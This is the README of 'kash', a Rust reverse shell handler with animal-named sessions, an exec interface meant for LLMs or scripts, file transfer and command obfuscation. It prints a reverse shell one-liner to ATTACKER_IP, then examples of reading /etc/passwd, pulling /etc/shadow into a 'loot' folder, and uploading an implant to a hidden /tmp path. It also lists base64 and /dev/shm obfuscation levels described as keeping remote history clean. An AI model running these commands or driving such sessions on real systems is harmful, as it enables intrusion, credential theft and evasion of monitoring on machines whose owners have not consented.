# kash

A reverse shell handler written in Rust, with Docker-style session management.
Start a listener in the background, attach interactively from any terminal, and let an LLM or script run commands in the same live session via `kash exec`.
Sessions are named after animals (`monkey`, `tiger`, `panda`, …) so they are easy to type.

---

## Installation

Requires Rust 1.85+ (edition 2024). From source:

```bash
git clone https://github.com/borrasnil/kash && cd kash

# build a release binary
cargo build --release

# install it onto your PATH as `kash`
cargo install --path .

# or just use the built binary directly
./target/release/kash --version
```

---

## Help

```console
$ kash -h
Reverse shell handler with obfuscation and session management

Usage: kash <COMMAND>

Commands:
  listen    Start a listener and wait for an incoming reverse shell
  ps        List active shell sessions
  exec      Execute a command in a running session
  inspect   Show detailed information about a session
  kill      Terminate a running session gracefully
  attach    Re-attach an interactive terminal to a detached session
  upload    Upload a local file to a running session's remote system
  download  Download a file from a running session's remote system
  help      Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help (see more with '--help')
  -V, --version  Print version
```

### `kash listen -h`

```console
$ kash listen -h
Start a listener and wait for an incoming reverse shell

Usage: kash listen [OPTIONS] <PORT>

Arguments:
  <PORT>  TCP port to listen on

Options:
  -l, --listen <LISTEN>            Bind address (default: all interfaces) [default: 0.0.0.0]
  -o, --obfuscation <OBFUSCATION>  Obfuscation level applied to every sent command: none | light | medium | heavy [default: none]
  -s, --shell <SHELL>              Target shell type: auto | linux | windows [default: auto]
      --session <SESSION>          Override the random session ID with a custom value (useful for scripts)
  -d, --daemon                     Background the listener immediately — TCP connection still accepted in the background process. Reconnect interactively with `attach <session-id>`. Unix only
  -h, --help                       Print help
```

### `kash exec -h`

```console
$ kash exec -h
Execute a command in a running session

Usage: kash exec [OPTIONS] <SESSION> [COMMAND]...

Arguments:
  <SESSION>     Session ID to inject the command into
  [COMMAND]...  Command tokens (joined with spaces). Use --cmd for complex commands

Options:
  -c, --cmd <CMD>        Exact command string sent to the remote shell — no token splitting. Use this for commands that contain quotes, pipes, or other shell syntax. When present, any trailing positional tokens are ignored
      --format <FORMAT>  Output format: text (default) or json [default: text]
  -h, --help             Print help (see more with '--help')
```

### Remaining subcommands

```console
$ kash ps -h
List active shell sessions

Usage: kash ps [OPTIONS]

Options:
  -q, --quiet  Print only session IDs, one per line (machine-readable)
      --json   Output as JSON array
  -h, --help   Print help
```

```console
$ kash inspect -h
Show detailed information about a session

Usage: kash inspect <SESSION>

Arguments:
  <SESSION>  Session ID to inspect

Options:
  -h, --help  Print help
```

```console
$ kash kill -h
Terminate a running session gracefully

Usage: kash kill <SESSION>

Arguments:
  <SESSION>  Session ID to terminate

Options:
  -h, --help  Print help
```

```console
$ kash attach -h
Re-attach an interactive terminal to a detached session

Usage: kash attach <SESSION>

Arguments:
  <SESSION>  Session ID to attach to

Options:
  -h, --help  Print help
```

```console
$ kash upload -h
Upload a local file to a running session's remote system

Usage: kash upload <SESSION> <LOCAL> [REMOTE]

Arguments:
  <SESSION>  Session ID
  <LOCAL>    Local file path to upload
  [REMOTE]   Remote destination path (defaults to the local filename)

Options:
  -h, --help  Print help
```

```console
$ kash download -h
Download a file from a running session's remote system

Usage: kash download <SESSION> <REMOTE> [LOCAL]

Arguments:
  <SESSION>  Session ID
  <REMOTE>   Remote file path to download
  [LOCAL]    Local destination path (defaults to the remote filename)

Options:
  -h, --help  Print help
```

---

## Basic usage

### 1. Start a listener

```bash
kash listen 4444 -d
```

```console
  kash  ────────────────────────────  v0.2.1  daemon

  obfuscation  : none
  shell type   : auto
  listener     : 0.0.0.0:4444
  session id   : monkey

  [*] listening in background — attach with: kash attach monkey
```

Without `-d` the terminal is dropped straight into the session when a shell connects. `-d` returns the terminal immediately (Unix only) and the session ID is an animal name that skips names already used by an active session.

### 2. Connect from the target

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

On connect the target is upgraded to a PTY (`pty.spawn` / `script`) and every keystroke is forwarded byte-for-byte — vim, htop, python REPL and ssh all work.

### 3. Attach, detach, re-attach

```bash
kash attach monkey
# [+] attached to session monkey  ·  CTRL+Q to detach
```

**CTRL+Q** detaches without killing the shell; the TCP connection stays alive. Re-attach any number of times from any terminal. A single interactive client is allowed at a time.

### 4. List and inspect sessions

```bash
kash ps
# SESSION     PEER                    IDENTITY              OBFUSCATION   SHELL
# monkey      192.168.1.100:55705     www-data@targetbox    heavy         linux

kash ps -q            # IDs only — for scripts
kash ps --json        # full metadata as JSON

kash inspect monkey
#   Session       monkey
#   Peer          192.168.1.100:55705
#   Identity      www-data@targetbox
#   Obfuscation   heavy
#   Shell         linux
#   Started       2026-07-01 14:30:22 UTC  (42m ago)
#   Commands      17
#   Last cmd      cat /etc/passwd  (8m ago)
```

### 5. Run commands (human or LLM)

```bash
# simple commands — trailing tokens are fine
kash exec monkey whoami
kash exec monkey ls -la /etc

# anything with quotes, pipes or metacharacters — always use --cmd
kash exec monkey --cmd "cat /etc/passwd | grep root"
kash exec monkey --cmd "python3 -c \"print('hello')\""

# JSON output for automation
kash exec --format json monkey --cmd "id"
# {"output":"uid=33(www-data) gid=33(www-data)...\n","exit_code":0}
```

Typical script/LLM flow:

```bash
SESSION=$(kash ps -q | head -1)
kash exec --format json "$SESSION" --cmd "id"
kash exec "$SESSION" --cmd "test -w /etc" && echo writable
```

`exec` is serialised: while it runs, the interactive terminal shows `[>] agent: <cmd>` and `[agent running...]`; **CTRL+C** cancels the injected command (exit code `130`). `exec` is rejected while an interactive client is attached.

### 6. Transfer files

```bash
kash upload   monkey ./implant.elf /tmp/.x
kash download monkey /etc/shadow loot/shadow.txt
```

Or from inside the session, type `upload` / `download` directly at the prompt. Transfers stream base64 with SHA256 verification, keep remote history clean, and work at any file size.

### 7. End a session

```bash
kash kill monkey
```

The session exits gracefully and its `/tmp/.shh-monkey.{sock,info}` files are removed. `ps` discovers sessions by scanning `/tmp/.shh-*.sock`, so no daemon is needed.

### Obfuscation levels

| Level | Technique |
|---|---|
| `none` | Commands sent verbatim. **Default**, safest. |
| `light` | `""` injection between characters |
| `medium` | Random variant: temp-file eval, base64, printf hex, `$0 -c` |
| `heavy` | Random variant: double/triple base64, `/dev/shm` staging, printf octal |

Windows targets always use pass-through. `light`/`medium`/`heavy` break multiline commands and can choke on single quotes — raise the level only when you need it.
